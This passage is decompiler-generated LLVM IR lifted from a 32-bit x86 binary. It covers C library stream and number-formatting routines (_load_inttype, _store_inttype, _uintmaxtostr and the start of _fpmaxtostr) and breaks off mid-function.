  %v1_804f1a3 = trunc i32 %v2_804f1a1 to i16
  store i16 %v1_804f1a3, i16* %arg1, align 2
  %v0_804f1a6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f1a6

dec_label_pc_804f1a6:                             ; preds = %entry, %dec_label_pc_804f1a1
  %v0_804f1eb = phi i32 [ %v4_804f188, %entry ], [ %v0_804f1a6.pre, %dec_label_pc_804f1a1 ]
  %v1_804f1a6 = inttoptr i32 %v0_804f1eb to i16*
  %v2_804f1a6 = load i16, i16* %v1_804f1a6, align 2
  %v3_804f1a6 = zext i16 %v2_804f1a6 to i32
  store i32 %v3_804f1a6, i32* %edx.global-to-local, align 4
  %v2_804f1a9 = and i16 %v2_804f1a6, 32
  %v3_804f1a9 = icmp eq i16 %v2_804f1a9, 0
  br i1 %v3_804f1a9, label %dec_label_pc_804f1c2, label %dec_label_pc_804f1ae

dec_label_pc_804f1ae:                             ; preds = %dec_label_pc_804f1a6, %dec_label_pc_804f199
  %v1_804f1ae = call i32 @__errno_location(i32 %v0_804f184)
  store i32 %v1_804f1ae, i32* %eax.global-to-local, align 4
  %v1_804f1b3 = inttoptr i32 %v1_804f1ae to i32*
  store i32 9, i32* %v1_804f1b3, align 4
  br label %dec_label_pc_804f1b9

dec_label_pc_804f1b9:                             ; preds = %dec_label_pc_804f1d9, %dec_label_pc_804f1ae
  %v0_804f1b9 = load i32, i32* @ebx, align 4
  %v1_804f1b9 = inttoptr i32 %v0_804f1b9 to i16*
  %v2_804f1b9 = load i16, i16* %v1_804f1b9, align 2
  %v3_804f1b9 = or i16 %v2_804f1b9, 8
  store i16 %v3_804f1b9, i16* %v1_804f1b9, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f21c

dec_label_pc_804f1c2:                             ; preds = %dec_label_pc_804f1a6
  %v2_804f1c2 = urem i16 %v2_804f1a6, 4
  %v3_804f1c2 = icmp eq i16 %v2_804f1c2, 0
  br i1 %v3_804f1c2, label %dec_label_pc_804f208, label %dec_label_pc_804f1c7

dec_label_pc_804f1c7:                             ; preds = %dec_label_pc_804f1c2
  %v2_804f1c7 = and i32 %v3_804f1a6, 4
  %v3_804f1c7 = icmp eq i32 %v2_804f1c7, 0
  %v1_804f1ca = icmp eq i1 %v3_804f1c7, false
  br i1 %v1_804f1ca, label %dec_label_pc_804f1f8, label %dec_label_pc_804f1cc

dec_label_pc_804f1cc:                             ; preds = %dec_label_pc_804f1c7
  %v1_804f1cc = add i32 %v0_804f1eb, 20
  %v2_804f1cc = inttoptr i32 %v1_804f1cc to i32*
  %v3_804f1cc = load i32, i32* %v2_804f1cc, align 4
  store i32 %v3_804f1cc, i32* %eax.global-to-local, align 4
  %v2_804f1cf = add i32 %v0_804f1eb, 16
  %v3_804f1cf = inttoptr i32 %v2_804f1cf to i32*
  %v4_804f1cf = load i32, i32* %v3_804f1cf, align 4
  %v15_804f1cf = icmp eq i32 %v3_804f1cc, %v4_804f1cf
  %v1_804f1d2 = icmp eq i1 %v15_804f1cf, false
  br i1 %v1_804f1d2, label %dec_label_pc_804f1d9, label %dec_label_pc_804f1d4

dec_label_pc_804f1d4:                             ; preds = %dec_label_pc_804f1cc
  %v2_804f1d4 = and i32 %v3_804f1a6, 2
  %v3_804f1d4 = icmp eq i32 %v2_804f1d4, 0
  br i1 %v3_804f1d4, label %dec_label_pc_804f1f8, label %dec_label_pc_804f1d9

dec_label_pc_804f1d9:                             ; preds = %dec_label_pc_804f1d4, %dec_label_pc_804f1cc
  %v1_804f1d9 = and i32 %v3_804f1a6, 1024
  store i32 %v1_804f1d9, i32* %edx.global-to-local, align 4
  %tmp18 = udiv i32 %v1_804f1d9, 1024
  %tmp19 = xor i32 %tmp18, 3
  store i32 %tmp19, i32* %eax.global-to-local, align 4
  %v5_804f1ec = call i32 @__GI_fseek(i32 %v0_804f1eb, i32 0, i32 %tmp19, i32 %v1_804f1d9)
  store i32 %v5_804f1ec, i32* %eax.global-to-local, align 4
  %v1_804f1f4 = icmp eq i32 %v5_804f1ec, 0
  %v1_804f1f6 = icmp eq i1 %v1_804f1f4, false
  br i1 %v1_804f1f6, label %dec_label_pc_804f1b9, label %dec_label_pc_804f1d9.dec_label_pc_804f1f8_crit_edge

dec_label_pc_804f1d9.dec_label_pc_804f1f8_crit_edge: ; preds = %dec_label_pc_804f1d9
  %v0_804f1f8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f1f8

dec_label_pc_804f1f8:                             ; preds = %dec_label_pc_804f1d9.dec_label_pc_804f1f8_crit_edge, %dec_label_pc_804f1d4, %dec_label_pc_804f1c7
  %v10_804f1f8 = phi i32 [ %v0_804f1f8.pre, %dec_label_pc_804f1d9.dec_label_pc_804f1f8_crit_edge ], [ %v0_804f1eb, %dec_label_pc_804f1d4 ], [ %v0_804f1eb, %dec_label_pc_804f1c7 ]
  %v1_804f1f8 = inttoptr i32 %v10_804f1f8 to i16*
  %v2_804f1f8 = load i16, i16* %v1_804f1f8, align 2
  %v3_804f1f8 = and i16 %v2_804f1f8, -4
  store i16 %v3_804f1f8, i16* %v1_804f1f8, align 2
  %v0_804f1fc = load i32, i32* @ebx, align 4
  %v1_804f1fc = add i32 %v0_804f1fc, 8
  %v2_804f1fc = inttoptr i32 %v1_804f1fc to i32*
  %v3_804f1fc = load i32, i32* %v2_804f1fc, align 4
  store i32 %v3_804f1fc, i32* %eax.global-to-local, align 4
  %v2_804f1ff = add i32 %v0_804f1fc, 24
  %v3_804f1ff = inttoptr i32 %v2_804f1ff to i32*
  store i32 %v3_804f1fc, i32* %v3_804f1ff, align 4
  %v0_804f202 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f202 = load i32, i32* @ebx, align 4
  %v2_804f202 = add i32 %v1_804f202, 16
  %v3_804f202 = inttoptr i32 %v2_804f202 to i32*
  store i32 %v0_804f202, i32* %v3_804f202, align 4
  %v0_804f205 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f205 = load i32, i32* @ebx, align 4
  %v2_804f205 = add i32 %v1_804f205, 20
  %v3_804f205 = inttoptr i32 %v2_804f205 to i32*
  store i32 %v0_804f205, i32* %v3_804f205, align 4
  %v0_804f208.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f208

dec_label_pc_804f208:                             ; preds = %dec_label_pc_804f1c2, %dec_label_pc_804f1f8
  %v9_804f208 = phi i32 [ %v0_804f1eb, %dec_label_pc_804f1c2 ], [ %v0_804f208.pre, %dec_label_pc_804f1f8 ]
  %v1_804f208 = inttoptr i32 %v9_804f208 to i16*
  %v2_804f208 = load i16, i16* %v1_804f208, align 2
  %v3_804f208 = or i16 %v2_804f208, 64
  store i16 %v3_804f208, i16* %v1_804f208, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804f20e = load i32, i32* @ebx, align 4
  %v1_804f20e = inttoptr i32 %v0_804f20e to i16*
  %v2_804f20e = load i16, i16* %v1_804f20e, align 2
  %v3_804f20e = zext i16 %v2_804f20e to i32
  store i32 %v3_804f20e, i32* %eax.global-to-local, align 4
  %v3_804f211 = and i16 %v2_804f20e, 2816
  %v4_804f211 = icmp eq i16 %v3_804f211, 0
  %v1_804f214 = icmp eq i1 %v4_804f211, false
  br i1 %v1_804f214, label %dec_label_pc_804f21c, label %dec_label_pc_804f216

dec_label_pc_804f216:                             ; preds = %dec_label_pc_804f208
  %v1_804f216 = add i32 %v0_804f20e, 12
  %v2_804f216 = inttoptr i32 %v1_804f216 to i32*
  %v3_804f216 = load i32, i32* %v2_804f216, align 4
  store i32 %v3_804f216, i32* %eax.global-to-local, align 4
  %v2_804f219 = add i32 %v0_804f20e, 28
  %v3_804f219 = inttoptr i32 %v2_804f219 to i32*
  store i32 %v3_804f216, i32* %v3_804f219, align 4
  %v0_804f21c.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f21c

dec_label_pc_804f21c:                             ; preds = %dec_label_pc_804f208, %dec_label_pc_804f1b9, %dec_label_pc_804f216
  %v0_804f21c = phi i32 [ 0, %dec_label_pc_804f208 ], [ -1, %dec_label_pc_804f1b9 ], [ %v0_804f21c.pre, %dec_label_pc_804f216 ]
  store i32 %v0_804f21c, i32* %eax.global-to-local, align 4
  %v2_804f21e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f21e, i32* %edx.global-to-local, align 4
  store i32 %v0_804f184, i32* @ebx, align 4
  ret i32 %v0_804f21c

; uselistorder directives
  uselistorder i32 %v0_804f21c, { 1, 0 }
  uselistorder i32 %v0_804f20e, { 1, 0, 2 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i32 %v1_804f1d9, { 1, 0, 2 }
  uselistorder i32 %v0_804f1eb, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804f192, { 1, 0 }
  uselistorder i32 %v2_804f190, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804f184, { 1, 0 }
  uselistorder i16 64, { 1, 0 }
  uselistorder i32 1024, { 0, 7, 6, 5, 8, 3, 1, 2, 4 }
  uselistorder i16 8, { 1, 3, 4, 2, 5, 0 }
  uselistorder i16 0, { 4, 5, 6, 0, 7, 1, 8, 2, 3 }
  uselistorder i16 32, { 3, 0, 1, 2 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f21c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f208, { 1, 0 }
  uselistorder label %dec_label_pc_804f1a6, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_804f22c = icmp slt i32 %tmp, 0
  %v3_804f255 = and i32 %tmp5, 2048
  %v4_804f255 = icmp eq i32 %v3_804f255, 0
  br i1 %v5_804f22c, label %dec_label_pc_804f255, label %dec_label_pc_804f233

dec_label_pc_804f233:                             ; preds = %entry
  %v1_804f236 = icmp eq i1 %v4_804f255, false
  br i1 %v1_804f236, label %dec_label_pc_804f25a, label %dec_label_pc_804f238

dec_label_pc_804f238:                             ; preds = %dec_label_pc_804f233
  %v1_804f238 = inttoptr i32 %tmp4 to i32*
  %v2_804f238 = load i32, i32* %v1_804f238, align 4
  %v6_804f23a = icmp eq i32 %tmp5, 256
  %v1_804f240 = icmp eq i1 %v6_804f23a, false
  br i1 %v1_804f240, label %dec_label_pc_804f247, label %dec_label_pc_804f242

dec_label_pc_804f242:                             ; preds = %dec_label_pc_804f238
  %v1_804f242 = urem i32 %v2_804f238, 256
  br label %dec_label_pc_804f252

dec_label_pc_804f247:                             ; preds = %dec_label_pc_804f238
  %v6_804f247 = icmp eq i32 %tmp5, 512
  %v1_804f24d = icmp eq i1 %v6_804f247, false
  br i1 %v1_804f24d, label %dec_label_pc_804f252, label %dec_label_pc_804f24f

dec_label_pc_804f24f:                             ; preds = %dec_label_pc_804f247
  %v1_804f24f = urem i32 %v2_804f238, 65536
  br label %dec_label_pc_804f252

dec_label_pc_804f252:                             ; preds = %dec_label_pc_804f247, %dec_label_pc_804f242, %dec_label_pc_804f24f
  %v0_804f254 = phi i32 [ %v2_804f238, %dec_label_pc_804f247 ], [ %v1_804f242, %dec_label_pc_804f242 ], [ %v1_804f24f, %dec_label_pc_804f24f ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_804f254

dec_label_pc_804f255:                             ; preds = %entry
  br i1 %v4_804f255, label %dec_label_pc_804f260, label %dec_label_pc_804f25a

dec_label_pc_804f25a:                             ; preds = %dec_label_pc_804f255, %dec_label_pc_804f233
  %v1_804f25a = add i32 %tmp4, 4
  %v2_804f25a = inttoptr i32 %v1_804f25a to i32*
  %v3_804f25a = load i32, i32* %v2_804f25a, align 4
  store i32 %v3_804f25a, i32* @edx, align 4
  %v1_804f25d = inttoptr i32 %tmp4 to i32*
  %v2_804f25d = load i32, i32* %v1_804f25d, align 4
  ret i32 %v2_804f25d

dec_label_pc_804f260:                             ; preds = %dec_label_pc_804f255
  %v1_804f260 = inttoptr i32 %tmp4 to i32*
  %v2_804f260 = load i32, i32* %v1_804f260, align 4
  %v6_804f262 = icmp eq i32 %tmp5, 256
  %v1_804f268 = icmp eq i1 %v6_804f262, false
  br i1 %v1_804f268, label %dec_label_pc_804f26f, label %dec_label_pc_804f26a

dec_label_pc_804f26a:                             ; preds = %dec_label_pc_804f260
  %v1_804f26a = mul i32 %v2_804f260, 16777216
  %v2_804f26a = sdiv i32 %v1_804f26a, 16777216
  br label %dec_label_pc_804f278

dec_label_pc_804f26f:                             ; preds = %dec_label_pc_804f260
  %v6_804f26f = icmp eq i32 %tmp5, 512
  %v1_804f275 = icmp eq i1 %v6_804f26f, false
  br i1 %v1_804f275, label %dec_label_pc_804f278, label %dec_label_pc_804f277

dec_label_pc_804f277:                             ; preds = %dec_label_pc_804f26f
  %v1_804f277 = mul i32 %v2_804f260, 65536
  %v2_804f277 = sdiv i32 %v1_804f277, 65536
  br label %dec_label_pc_804f278

dec_label_pc_804f278:                             ; preds = %dec_label_pc_804f26f, %dec_label_pc_804f26a, %dec_label_pc_804f277
  %v0_804f278 = phi i32 [ %v2_804f260, %dec_label_pc_804f26f ], [ %v2_804f26a, %dec_label_pc_804f26a ], [ %v2_804f277, %dec_label_pc_804f277 ]
  %v1_804f278 = ashr i32 %v0_804f278, 31
  store i32 %v1_804f278, i32* @edx, align 4
  ret i32 %v0_804f278

; uselistorder directives
  uselistorder i32 %v0_804f278, { 1, 0 }
  uselistorder i32 %v2_804f260, { 2, 0, 1 }
  uselistorder i32 %v2_804f238, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 6, 5, 8, 7, 10, 9, 12, 11 }
  uselistorder label %dec_label_pc_804f278, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f252, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_2()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f27c = load i32, i32* @ebx, align 4
  store i32 %v0_804f27c, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_804f281 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_804f281, i32* %ebx.global-to-local, align 4
  %v4_804f285 = trunc i32 %tmp4 to i16
  %v6_804f28d = icmp eq i32 %tmp6, 256
  %v1_804f293 = icmp eq i1 %v6_804f28d, false
  br i1 %v1_804f293, label %dec_label_pc_804f299, label %dec_label_pc_804f295

dec_label_pc_804f295:                             ; preds = %entry
  %v2_804f295 = trunc i32 %tmp4 to i8
  %v4_804f295 = bitcast i16* %tmp5 to i8*
  store i8 %v2_804f295, i8* %v4_804f295, align 1
  br label %dec_label_pc_804f2b7

dec_label_pc_804f299:                             ; preds = %entry
  %v6_804f299 = icmp eq i32 %tmp6, 2048
  %v1_804f29f = icmp eq i1 %v6_804f299, false
  br i1 %v1_804f29f, label %dec_label_pc_804f2a8, label %dec_label_pc_804f2a1

dec_label_pc_804f2a1:                             ; preds = %dec_label_pc_804f299
  %sext2 = mul i32 %tmp4, 65536
  %v1_804f2a1 = sdiv i32 %sext2, 65536
  %v3_804f2a1 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804f2a1, i32* %v3_804f2a1, align 4
  %v0_804f2a3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f2a3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f2a3 = add i32 %v1_804f2a3, 4
  %v3_804f2a3 = inttoptr i32 %v2_804f2a3 to i32*
  store i32 %v0_804f2a3, i32* %v3_804f2a3, align 4
  br label %dec_label_pc_804f2b7

dec_label_pc_804f2a8:                             ; preds = %dec_label_pc_804f299
  %v6_804f2a8 = icmp eq i32 %tmp6, 512
  %v1_804f2ae = icmp eq i1 %v6_804f2a8, false
  br i1 %v1_804f2ae, label %dec_label_pc_804f2b5, label %dec_label_pc_804f2b0

dec_label_pc_804f2b0:                             ; preds = %dec_label_pc_804f2a8
  store i16 %v4_804f285, i16* %tmp5, align 2
  br label %dec_label_pc_804f2b7

dec_label_pc_804f2b5:                             ; preds = %dec_label_pc_804f2a8
  %sext3 = mul i32 %tmp4, 65536
  %v1_804f2b5 = sdiv i32 %sext3, 65536
  %v3_804f2b5 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804f2b5, i32* %v3_804f2b5, align 4
  br label %dec_label_pc_804f2b7

dec_label_pc_804f2b7:                             ; preds = %dec_label_pc_804f2b0, %dec_label_pc_804f2a1, %dec_label_pc_804f295, %dec_label_pc_804f2b5
  %v2_804f2b7 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f2b7, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_804f2b8 = sdiv i32 %sext, 65536
  ret i32 %v1_804f2b8

; uselistorder directives
  uselistorder i32 512, { 0, 1, 2, 6, 3, 7, 8, 4, 5 }
  uselistorder label %dec_label_pc_804f2b7, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_804f2c7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f2c7, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_804f2d3 = icmp slt i32 %arg4, 0
  %v1_804f2d5 = icmp eq i1 %v2_804f2d3, false
  br i1 %v1_804f2d5, label %dec_label_pc_804f2f6, label %dec_label_pc_804f2d7

dec_label_pc_804f2d7:                             ; preds = %entry
  %v1_804f2d7 = sub i32 0, %arg4
  store i32 %v1_804f2d7, i32* %esi.global-to-local, align 4
  %v2_804f2d9 = icmp slt i32 %arg3, 0
  %v1_804f2db = icmp eq i1 %v2_804f2d9, false
  br i1 %v1_804f2db, label %dec_label_pc_804f2f6, label %dec_label_pc_804f2dd

dec_label_pc_804f2dd:                             ; preds = %dec_label_pc_804f2d7
  %v1_804f2dd = sub i32 0, %arg2
  %v5_804f2dd = icmp ne i32 %arg2, 0
  store i32 %v1_804f2dd, i32* %ecx.global-to-local, align 4
  %v2_804f2df = zext i1 %v5_804f2dd to i32
  %v3_804f2df = add i32 %v2_804f2df, %arg3
  %v1_804f2ea = sub i32 0, %v3_804f2df
  store i32 %v1_804f2ea, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f2f6

dec_label_pc_804f2f6:                             ; preds = %entry, %dec_label_pc_804f2d7, %dec_label_pc_804f2dd
  %v0_804f2fb = phi i32 [ %v1_804f2d7, %dec_label_pc_804f2dd ], [ %v1_804f2d7, %dec_label_pc_804f2d7 ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_804f2dd ], [ 0, %dec_label_pc_804f2d7 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_804f2fb
  %tmp35 = urem i32 -1, %v0_804f2fb
  %v1_804f2fd = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_804f301 = load i32, i32* %esi.global-to-local, align 4
  %v12_804f301 = icmp eq i32 %v1_804f2fd, %v1_804f301
  %v1_804f30b = icmp eq i1 %v12_804f301, false
  br i1 %v1_804f30b, label %dec_label_pc_804f31a, label %dec_label_pc_804f30d

dec_label_pc_804f30d:                             ; preds = %dec_label_pc_804f2f6
  %v1_804f30d = add i32 %div, 1
  br label %dec_label_pc_804f31a

dec_label_pc_804f31a:                             ; preds = %dec_label_pc_804f2f6, %dec_label_pc_804f30d
  %stack_var_-20.0.off0 = phi i32 [ %v1_804f2fd, %dec_label_pc_804f2f6 ], [ 0, %dec_label_pc_804f30d ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_804f2f6 ], [ %v1_804f30d, %dec_label_pc_804f30d ]
  %v0_804f31a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804f31a, i32* %ebp.global-to-local, align 4
  %v0_804f31c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f31c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f322

dec_label_pc_804f322:                             ; preds = %dec_label_pc_804f361, %dec_label_pc_804f31a
  %v0_804f359 = phi i32 [ %v0_804f372, %dec_label_pc_804f361 ], [ %v0_804f31a, %dec_label_pc_804f31a ]
  %v0_804f326 = phi i32 [ %v1_804f374, %dec_label_pc_804f361 ], [ %v0_804f31c, %dec_label_pc_804f31a ]
  %v1_804f322 = icmp eq i32 %v0_804f326, 0
  br i1 %v1_804f322, label %dec_label_pc_804f359, label %dec_label_pc_804f326

dec_label_pc_804f326:                             ; preds = %dec_label_pc_804f322
  %v0_804f32a = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_804f326, %v0_804f32a
  %tmp36 = urem i32 %v0_804f326, %v0_804f32a
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_804f359, %v0_804f32a
  %tmp37 = urem i32 %v0_804f359, %v0_804f32a
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_804f33d = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_804f341 = add i32 %tmp37, %v6_804f33d
  %v8_804f347 = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_804f34c = add i32 %div8, %v8_804f347
  store i32 %v2_804f34c, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_804f341, %v0_804f32a
  %tmp38 = urem i32 %v2_804f341, %v0_804f32a
  %v2_804f354 = add i32 %div9, %v2_804f34c
  br label %dec_label_pc_804f361

dec_label_pc_804f359:                             ; preds = %dec_label_pc_804f322
  %v0_804f35d = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_804f359, %v0_804f35d
  %tmp39 = urem i32 %v0_804f359, %v0_804f35d
  br label %dec_label_pc_804f361

dec_label_pc_804f361:                             ; preds = %dec_label_pc_804f326, %dec_label_pc_804f359
  %v0_804f367 = phi i32 [ %tmp38, %dec_label_pc_804f326 ], [ %tmp39, %dec_label_pc_804f359 ]
  %storemerge = phi i32 [ %v2_804f354, %dec_label_pc_804f326 ], [ %div12, %dec_label_pc_804f359 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_804f361 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f361 = add i32 %v0_804f361, -1
  store i32 %v1_804f361, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_804f367, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_804f367
  %v8_804f367 = trunc i32 %storemerge14.in to i8
  %v3_804f370 = inttoptr i32 %v1_804f361 to i8*
  store i8 %v8_804f367, i8* %v3_804f370, align 1
  %v0_804f372 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f374 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f374 = or i32 %v1_804f374, %v0_804f372
  %v3_804f374 = icmp eq i32 %v2_804f374, 0
  %v1_804f376 = icmp eq i1 %v3_804f374, false
  br i1 %v1_804f376, label %dec_label_pc_804f322, label %dec_label_pc_804f378

dec_label_pc_804f378:                             ; preds = %dec_label_pc_804f361
  %v4_804f378 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_804f378, label %dec_label_pc_804f383, label %dec_label_pc_804f37f

dec_label_pc_804f37f:                             ; preds = %dec_label_pc_804f378
  %v0_804f37f = load i32, i32* %edi.global-to-local, align 4
  %v1_804f37f = add i32 %v0_804f37f, -1
  store i32 %v1_804f37f, i32* %edi.global-to-local, align 4
  %v1_804f380 = inttoptr i32 %v1_804f37f to i8*
  store i8 45, i8* %v1_804f380, align 1
  br label %dec_label_pc_804f383

dec_label_pc_804f383:                             ; preds = %dec_label_pc_804f378, %dec_label_pc_804f37f
  %v0_804f386 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f386

; uselistorder directives
  uselistorder i32 %v2_804f341, { 1, 0 }
  uselistorder i32 %v0_804f32a, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_804f326, { 1, 0, 2 }
  uselistorder i32 %v0_804f359, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804f2fb, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f383, { 1, 0 }
  uselistorder label %dec_label_pc_804f361, { 1, 0 }
  uselistorder label %dec_label_pc_804f31a, { 1, 0 }
  uselistorder label %dec_label_pc_804f2f6, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_5()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f391 = load i32, i32* @edi, align 4
  %v0_804f392 = load i32, i32* @esi, align 4
  %v0_804f393 = load i32, i32* @ebx, align 4
  store i32 %v0_804f393, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_804f3a8 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_804f3a8 = add i3 %v4_804f3a8, -1
  store i3 %v5_804f3a8, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804f3af = add i32 %tmp112, 4
  %v2_804f3af = inttoptr i32 %v1_804f3af to i32*
  %v3_804f3af = load i32, i32* %v2_804f3af, align 4
  store i32 %v3_804f3af, i32* %eax.global-to-local, align 4
  %v1_804f3b6 = add i32 %tmp112, 8
  %v2_804f3b6 = inttoptr i32 %v1_804f3b6 to i8*
  %v3_804f3b6 = load i8, i8* %v2_804f3b6, align 1
  %v4_804f3b6 = zext i8 %v3_804f3b6 to i32
  %v5_804f3b6 = load i32, i32* @ecx, align 4
  %v6_804f3b6 = and i32 %v5_804f3b6, -256
  %v7_804f3b6 = or i32 %v6_804f3b6, %v4_804f3b6
  store i32 %v7_804f3b6, i32* %ecx.global-to-local, align 4
  %v1_804f3b9 = inttoptr i32 %tmp112 to i32*
  %v2_804f3b9 = load i32, i32* %v1_804f3b9, align 4
  store i32 %v2_804f3b9, i32* %ebp.global-to-local, align 4
  %v3_804f3bb = and i32 %v3_804f3af, -256
  %v4_804f3bb = or i32 %v3_804f3bb, %v4_804f3b6
  %v1_804f3c1 = or i32 %v4_804f3bb, 32
  %v3_804f3c1 = trunc i32 %v1_804f3c1 to i8
  store i32 %v1_804f3c1, i32* %eax.global-to-local, align 4
  %v10_804f3cc = icmp eq i8 %v3_804f3c1, 97
  %v1_804f3ce = icmp eq i1 %v10_804f3cc, false
  br i1 %v1_804f3ce, label %dec_label_pc_804f3d7, label %dec_label_pc_804f3d0

dec_label_pc_804f3d0:                             ; preds = %entry
  %v1_804f3d0 = add i32 %v7_804f3b6, 6
  %v11_804f3d0 = trunc i32 %v1_804f3d0 to i8
  store i32 %v1_804f3d0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f3d7

dec_label_pc_804f3d7:                             ; preds = %entry, %dec_label_pc_804f3d0
  %stack_var_-206.0 = phi i8 [ %v3_804f3b6, %entry ], [ %v11_804f3d0, %dec_label_pc_804f3d0 ]
  %v2_804f3d7 = icmp slt i32 %v2_804f3b9, 0
  %v1_804f3d9 = icmp eq i1 %v2_804f3d7, false
  br i1 %v1_804f3d9, label %dec_label_pc_804f3e0, label %dec_label_pc_804f3db

dec_label_pc_804f3db:                             ; preds = %dec_label_pc_804f3d7
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f3e0

dec_label_pc_804f3e0:                             ; preds = %dec_label_pc_804f3d7, %dec_label_pc_804f3db
  store i32 %tmp112, i32* %edx.global-to-local, align 4
